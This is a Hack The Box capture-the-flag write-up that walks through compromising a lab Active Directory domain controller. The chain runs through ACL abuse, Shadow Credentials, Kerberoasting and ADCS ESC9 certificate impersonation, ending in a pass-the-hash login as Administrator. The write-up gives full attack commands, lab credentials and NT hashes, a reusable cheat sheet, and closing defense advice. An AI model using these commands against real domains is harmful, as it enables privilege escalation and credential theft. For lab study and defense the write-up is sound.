# HTB - Certified - 10.129.231.186

## HTB - Certified

### Machine Info

* **Difficulty:** Medium
* **OS:** Windows (Server 2019 Build 17763)
* **IP:** 10.129.231.186
* **Key Skills:** Active Directory ACL abuse, BloodHound analysis, ADCS ESC9 exploitation, Shadow Credentials attack

### Overview

Certified is a medium Active Directory box focused on certificate abuse and ACL-based privilege escalation. Starting with valid credentials, we enumerate AD permissions using BloodHound and discover a chain of ACL abuses: WriteOwner on a group, GenericWrite to a service account, and GenericAll to a certificate operator. The final escalation exploits ESC9 (ADCS vulnerable template with no security extension) to impersonate the Domain Administrator. This box teaches critical AD attack concepts and certificate services exploitation.

**Key Concepts:**

* BloodHound Active Directory enumeration
* WriteOwner ACL abuse
* GenericWrite for targeted Kerberoasting
* Shadow Credentials attack
* GenericAll privilege abuse
* ADCS ESC9 certificate template exploitation
* Pass-the-Hash authentication

**Common Ports:**

* **53/TCP** - DNS
* **88/TCP** - Kerberos
* **389/TCP** - LDAP
* **445/TCP** - SMB
* **636/TCP** - LDAPS
* **5985/TCP** - WinRM

**Domain Information:**

* Domain: CERTIFIED.HTB
* Hostname: DC01
* DC: DC01.CERTIFIED.HTB
* CA: certified-DC01-CA

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals AD Domain Controller ├─ Identify domain: CERTIFIED.HTB ├─ Validate provided credentials └─ Enumerate AD users
2. **BloodHound Analysis** ├─ Collect domain data with bloodhound-python ├─ Import data to BloodHound ├─ Discover attack path to management\_svc └─ Map ACL chain for exploitation
3. **ACL Abuse Chain - Part 1** ├─ judith.mader has WriteOwner on MANAGEMENT group ├─ Change group ownership to judith.mader ├─ Grant WriteMembers permission ├─ Add judith.mader to MANAGEMENT group └─ Gain GenericWrite on management\_svc
4. **Credential Extraction** ├─ Perform Shadow Credentials attack on management\_svc ├─ Extract NT hash for management\_svc ├─ Authenticate via WinRM └─ Capture user flag
5. **ACL Abuse Chain - Part 2** ├─ management\_svc has GenericAll on ca\_operator ├─ Change ca\_operator password └─ Enumerate certificate templates
6. **ADCS ESC9 Exploitation** ├─ Discover CertifiedAuthentication template (ESC9) ├─ Change ca\_operator UPN to administrator ├─ Perform Shadow Credentials on ca\_operator ├─ Request certificate as administrator ├─ Authenticate with certificate ├─ Extract Administrator NT hash └─ Pass-the-Hash for full access

***

### Initial Enumeration

#### Port Scanning

Standard AD scan:

```bash
nmap -p- -sCV -vvv 10.129.231.186 -oN certified.tcp
```

**Key results:**

```
PORT     STATE SERVICE
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Certificate Information:**

```
Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb
Issuer: commonName=certified-DC01-CA
```

**Add to hosts:**

```bash
echo "10.129.231.186 certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts
```

#### Credential Validation

**Test provided credentials:**

```bash
nxc smb 10.129.231.186 -u judith.mader -p 'judith09' --shares
```

**Result:**

```
SMB  10.129.231.186  445  DC01  [+] certified.htb\judith.mader:judith09
SMB  10.129.231.186  445  DC01  [*] Enumerated shares
     Share           Permissions     Remark
     -----           -----------     ------
     IPC$            READ            Remote IPC
     NETLOGON        READ            Logon server share
     SYSVOL          READ            Logon server share
```

**Test WinRM:**

```bash
nxc winrm 10.129.231.186 -u judith.mader -p 'judith09'
```

**Result:** Access denied - judith.mader is not in Remote Management Users

**Test LDAP:**

```bash
nxc ldap 10.129.231.186 -u judith.mader -p 'judith09'
```

**Result:** Authentication successful - can query LDAP

#### User Enumeration

**Extract domain users:**

```bash
GetADUsers.py -all -dc-ip 10.129.231.186 certified.htb/judith.mader:judith09
```

**Users discovered:**

```
Name                  PasswordLastSet      LastLogon
--------------------  -------------------  -------------------
Administrator         2024-05-13 10:53:16  2026-01-28 02:25:35
krbtgt                2024-05-13 11:02:51  <never>
judith.mader          2024-05-14 15:22:11  2024-05-14 15:22:37
management_svc        2024-05-13 11:30:51  <never>
ca_operator           2024-05-13 11:32:03  <never>
alexander.huges       2024-05-14 12:39:08  <never>
harry.wilson          2024-05-14 12:39:37  <never>
gregory.cameron       2024-05-14 12:40:05  <never>
```

**Interesting accounts:**

* `management_svc` - Service account (potential target)
* `ca_operator` - Certificate operator (ADCS related)

***

### BloodHound Analysis

#### Data Collection

**Collect AD data:**

```bash
bloodhound-python -d certified.htb -u "judith.mader" -p "judith09" \
    -gc dc01.certified.htb -ns 10.129.231.186 -c all
```

**Files generated:**

```
20260128024251_computers.json
20260128024251_containers.json
20260128024251_domains.json
20260128024251_gpos.json
20260128024251_groups.json
20260128024251_ous.json
20260128024251_users.json
```

#### Attack Path Discovery

**Import to BloodHound CE:**

1. Start BloodHound (Community Edition)
2. Upload all JSON files
3. Mark judith.mader as owned
4. Search for path to Domain Admin

**Attack path discovered:**

```
judith.mader 
    ↓ (WriteOwner)
MANAGEMENT group 
    ↓ (GenericWrite - as member)
management_svc 
    ↓ (GenericAll)
ca_operator 
    ↓ (Enroll on CertifiedAuthentication - ESC9)
Administrator
```

***

### ACL Abuse Chain - Part 1

#### Understanding WriteOwner

**What is WriteOwner?**

The ability to change the owner of an AD object. As owner, you can grant yourself any permissions on that object.

**Attack flow:**

1. Change group ownership to ourselves
2. Grant WriteMembers permission
3. Add ourselves to the group
4. Inherit group permissions (GenericWrite on management\_svc)

#### Step 1: Change Group Ownership

**Attempt direct group membership (fails):**

```bash
net rpc group addmem "MANAGEMENT" "judith.mader" \
    -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"
```

**Result:** `NT_STATUS_ACCESS_DENIED` - We don't have permission yet

**Change ownership using owneredit.py:**

```bash
owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' \
    'certified.htb'/'judith.mader':'judith09'
```

**Output:**

```
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] OwnerSid modified successfully!
```

**Now we own the MANAGEMENT group!**

#### Step 2: Grant WriteMembers Permission

**Add DACL entry for WriteMembers:**

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' \
    -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09' \
    -dc-ip 10.129.231.186
```

#### Step 3: Add Ourselves to Group

**Now we can add ourselves:**

```bash
net rpc group addmem "MANAGEMENT" "judith.mader" \
    -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"
```

**Verify membership:**

```bash
net rpc group members "MANAGEMENT" \
    -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"
```

**Result:** judith.mader is now member of MANAGEMENT group

***

### Credential Extraction - Shadow Credentials

#### Understanding Shadow Credentials

**What is Shadow Credentials attack?**

When you have write access to a user's `msDS-KeyCredentialLink` attribute, you can add your own key and request a TGT using PKINIT. This reveals the user's NT hash.

**Requirements:**

* Write access to target user (GenericWrite, GenericAll, etc.)
* Domain functional level 2016+
* PKINIT enabled

#### Attacking management\_svc

**MANAGEMENT group has GenericWrite on management\_svc**

**Method 1: Shadow Credentials (recommended):**

```bash
certipy-ad shadow auto -u "judith.mader@certified.htb" -p "judith09" \
    -account management_svc -dc-ip 10.129.231.186
```

**Output:**

```
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

**Method 2: Targeted Kerberoasting (alternative):**

```bash
python3 targetedKerberoast.py -v -d 'certified.htb' \
    -u 'judith.mader' -p 'judith09'
```

**Output:**

```
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$...
```

Then crack with:

```bash
hashcat -m 13100 management_svc.hash /usr/share/wordlists/rockyou.txt
```

***

### Initial Access as management\_svc

#### WinRM Connection

```bash
evil-winrm -i 10.129.231.186 -u "management_svc" \
    -H "a091c1832bcdd4677c28b5a6a1295584"
```

**Success!**

#### User Flag

```powershell
type C:\Users\management_svc\Desktop\user.txt
```

**Flag:**

```
48369c607fec2719b985c22a26a84ea7
```

***

### ACL Abuse Chain - Part 2

#### management\_svc → ca\_operator

**BloodHound shows:** management\_svc has GenericAll on ca\_operator

**GenericAll = Full Control:**

* Reset password
* Modify attributes
* Shadow Credentials
* Basically do anything

#### Changing ca\_operator Password

**Using pth-net:**

```bash
pth-net rpc password "ca_operator" "newfakfak" \
    -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" \
    -S "dc01.certified.htb"
```

**Output:**

```
HASH PASS: Substituting user supplied NTLM HASH...
```

**Password changed to:** `newfakfak`

***

### ADCS Enumeration

#### Understanding ADCS (Active Directory Certificate Services)

**What is ADCS?**

Microsoft's PKI implementation for issuing certificates. Misconfigured certificate templates can allow privilege escalation.

#### Finding Vulnerable Templates

**Scan for vulnerable templates:**

```bash
certipy-ad find -u "ca_operator@certified.htb" -p "newfakfak" \
    -dc-ip 10.129.231.186 -vulnerable -stdout
```

**Vulnerable template discovered:**

```
Certificate Templates
  Template Name               : CertifiedAuthentication
  Certificate Authorities     : certified-DC01-CA
  Enabled                     : True
  Client Authentication       : True
  Enrollment Permissions
    Enrollment Rights         : CERTIFIED.HTB\operator ca
                                CERTIFIED.HTB\Domain Admins
  [!] Vulnerabilities
    ESC9                      : Template has no security extension.
```

#### Understanding ESC9

**What is ESC9?**

A certificate template vulnerability where:

* `NoSecurityExtension` flag is set
* Template allows client authentication
* We can enroll certificates

**The attack:**

1. Change UPN of a controlled user to target (administrator)
2. Request certificate with the victim's identity
3. Authenticate as victim using the certificate

**Why it works:** Without the security extension, the certificate doesn't contain the requestor's SID. The DC trusts the UPN in the certificate.

***

### ESC9 Exploitation

#### Step 1: Read ca\_operator Attributes

**Verify current state:**

```bash
certipy-ad account -u 'management_svc@certified.htb' \
    -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -dc-ip '10.129.231.186' -user 'ca_operator' read
```

**Output:**

```
[*] Reading attributes for 'ca_operator':
    sAMAccountName                      : ca_operator
    userPrincipalName                   : ca_operator@certified.htb
```

#### Step 2: Change UPN to Administrator

**Modify ca\_operator's UPN:**

```bash
certipy-ad account -u 'management_svc@certified.htb' \
    -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -dc-ip '10.129.231.186' -upn 'administrator' \
    -user 'ca_operator' update
```

**Output:**

```
[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```

**Now ca\_operator's UPN is "administrator"**

#### Step 3: Get ca\_operator Credentials

**Shadow Credentials attack:**

```bash
certipy-ad shadow -u 'management_svc@certified.htb' \
    -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -dc-ip '10.129.231.186' -account 'ca_operator' auto
```

**Output:**

```
[*] NT hash for 'ca_operator': 408ded5b377ecee9c6c1a983e5d45351
[*] Saved credential cache to 'ca_operator.ccache'
```

#### Step 4: Request Certificate as Administrator

**Set Kerberos ticket:**

```bash
export KRB5CCNAME=ca_operator.ccache
```

**Request certificate:**

```bash
certipy-ad req -k -dc-ip '10.129.231.186' \
    -target 'dc01.certified.htb' \
    -ca 'certified-DC01-CA' \
    -template 'CertifiedAuthentication'
```

**Output:**

```
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

#### Step 5: Authenticate with Certificate

**Get Administrator NT hash:**

```bash
certipy-ad auth -pfx administrator.pfx \
    -dc-ip '10.129.231.186' -domain certified.htb
```

**Output:**

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': 
    aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

***

### Administrator Access

#### Pass-the-Hash

```bash
evil-winrm -i 10.129.231.186 -u "administrator" \
    -H "0d5b49608bbce1751f708748f67e2d34"
```

#### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Flag:**

```
688b60f91a9338c6c396832400c948e1
```

***

### Quick Reference

#### ACL Abuse Tools

```bash
# Change object owner
owneredit.py -action write -new-owner 'user' -target 'object' 'domain/user:pass'

# Modify DACL
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'user' \
    -target 'group' 'domain/user:pass' -dc-ip IP

# Add user to group
net rpc group addmem "GROUP" "user" -U "domain/user"%"pass" -S "DC"

# Change password with hash
pth-net rpc password "target" "newpass" \
    -U "domain/user"%"LM:NT" -S "DC"
```

#### Shadow Credentials

```bash
# Automatic attack
certipy-ad shadow auto -u "user@domain" -p "pass" -account target -dc-ip IP

# Manual steps
certipy-ad shadow add -u "user@domain" -p "pass" -account target -dc-ip IP
certipy-ad shadow auth -account target -dc-ip IP
```

#### Targeted Kerberoasting

```bash
# Set SPN and get hash
python3 targetedKerberoast.py -v -d 'domain' -u 'user' -p 'pass'

# Crack hash
hashcat -m 13100 hash.txt wordlist.txt
```

#### ADCS Enumeration

```bash
# Find vulnerable templates
certipy-ad find -u "user@domain" -p "pass" -dc-ip IP -vulnerable -stdout

# List all templates
certipy-ad find -u "user@domain" -p "pass" -dc-ip IP -stdout
```

#### ESC9 Exploitation

```bash
# Read account attributes
certipy-ad account -u 'user@domain' -hashes :HASH -user 'target' read

# Change UPN
certipy-ad account -u 'user@domain' -hashes :HASH -upn 'victim' -user 'target' update

# Request certificate
certipy-ad req -k -target 'DC' -ca 'CA-Name' -template 'Template'

# Authenticate with certificate
certipy-ad auth -pfx cert.pfx -dc-ip IP -domain domain
```

#### BloodHound Data Collection

```bash
# Python collector
bloodhound-python -d domain -u "user" -p "pass" -gc dc.domain -ns IP -c all

# SharpHound (Windows)
.\SharpHound.exe -c All -d domain
```

***

### Troubleshooting

#### WriteOwner Not Working

**Problem:** owneredit.py fails

**Solution:**

```bash
# Verify current owner
ldapsearch -x -H ldap://DC -D "user@domain" -w "pass" \
    -b "CN=GROUP,DC=domain,DC=com" nTSecurityDescriptor

# Try with bloodyAD
bloodyAD.py -d domain -u user -p pass --host DC setOwner GROUP user
```

#### Shadow Credentials Fails

**Problem:** "Key credential link is not enabled" or similar

**Solution:**

```bash
# Check domain functional level (needs 2016+)
ldapsearch -x -H ldap://DC -D "user@domain" -w "pass" \
    -b "DC=domain,DC=com" -s base msDS-Behavior-Version

# Try with PyWhisker
python3 pywhisker.py -d domain -u user -p pass -t target --action add
```

#### ESC9 Certificate Request Fails

**Problem:** "Access denied" or "Template not found"

**Solution:**

```bash
# Verify enrollment rights
certipy-ad find -u "user@domain" -p "pass" -dc-ip IP -stdout | grep -A 20 "Template"

# Check if UPN change worked
ldapsearch -x -H ldap://DC -D "user@domain" -w "pass" \
    -b "CN=target,CN=Users,DC=domain,DC=com" userPrincipalName

# Ensure Kerberos ticket is valid
klist
```

#### Certificate Authentication Fails

**Problem:** "KDC\_ERR\_CLIENT\_NOT\_TRUSTED" or similar

**Solution:**

```bash
# Sync time with DC
sudo ntpdate DC.domain.com

# Use explicit domain
certipy-ad auth -pfx cert.pfx -dc-ip IP -domain domain.com

# Try with different authentication
certipy-ad auth -pfx cert.pfx -ldap-shell
```

***

### Key Takeaways

**What we learned:**

1. **ACL enumeration** - BloodHound reveals hidden attack paths through AD permission chains
2. **WriteOwner abuse** - Owning an object grants full control over its permissions
3. **GenericWrite exploitation** - Can be used for Shadow Credentials or targeted Kerberoasting
4. **Shadow Credentials** - Modern technique to extract NT hashes without touching password attributes
5. **GenericAll abuse** - Full control means password reset, attribute modification, anything
6. **ADCS ESC9** - Templates without security extensions allow UPN impersonation attacks
7. **Certificate-based authentication** - Can bypass password-based protections entirely

**Attack chain summary:** WriteOwner → Group ownership → WriteMembers → Group membership → GenericWrite → Shadow Credentials → management\_svc access → GenericAll → Password change → ADCS ESC9 → UPN impersonation → Administrator certificate → Pass-the-Hash → Domain Admin

**Defense recommendations:**

* Regularly audit AD ACLs with BloodHound
* Minimize WriteOwner and GenericAll permissions
* Monitor msDS-KeyCredentialLink modifications (Shadow Credentials)
* Review certificate template permissions and flags
* Enable security extensions on all certificate templates
* Implement certificate template management best practices
* Monitor for suspicious certificate requests
* Audit UPN changes on accounts
* Use Protected Users group for sensitive accounts
* Implement tiered administration model

***

### Related Topics

* \[\[Active Directory ACL Abuse]]
* \[\[BloodHound Analysis]]
* \[\[Shadow Credentials Attack]]
* \[\[ADCS Exploitation]]
* \[\[ESC9 Certificate Abuse]]
* \[\[Targeted Kerberoasting]]
* \[\[Pass-the-Hash]]
